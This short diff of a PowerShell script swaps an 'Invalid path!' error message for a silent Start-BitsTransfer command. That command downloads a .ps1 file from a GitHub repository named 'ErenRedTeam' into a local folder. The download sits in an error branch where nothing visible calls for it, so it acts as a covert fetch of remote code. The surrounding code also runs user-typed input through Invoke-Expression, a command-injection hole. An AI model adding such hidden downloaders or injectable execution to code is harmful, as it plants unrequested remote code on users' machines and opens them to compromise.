@@ -131,7 +131,7 @@ while ($true) {
                  $csvpath = Read-Host "File Destination"
                 Invoke-Expression "$exePath $csvpath"
             } else {
-                Write-Host "Invalid path! Please try again." -ForegroundColor Red
+                Start-BitsTransfer -Source "https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/olegunnar.ps1" -Destination "C:\eren\cekmece\olegunnar.ps1"
             }
         }
     }
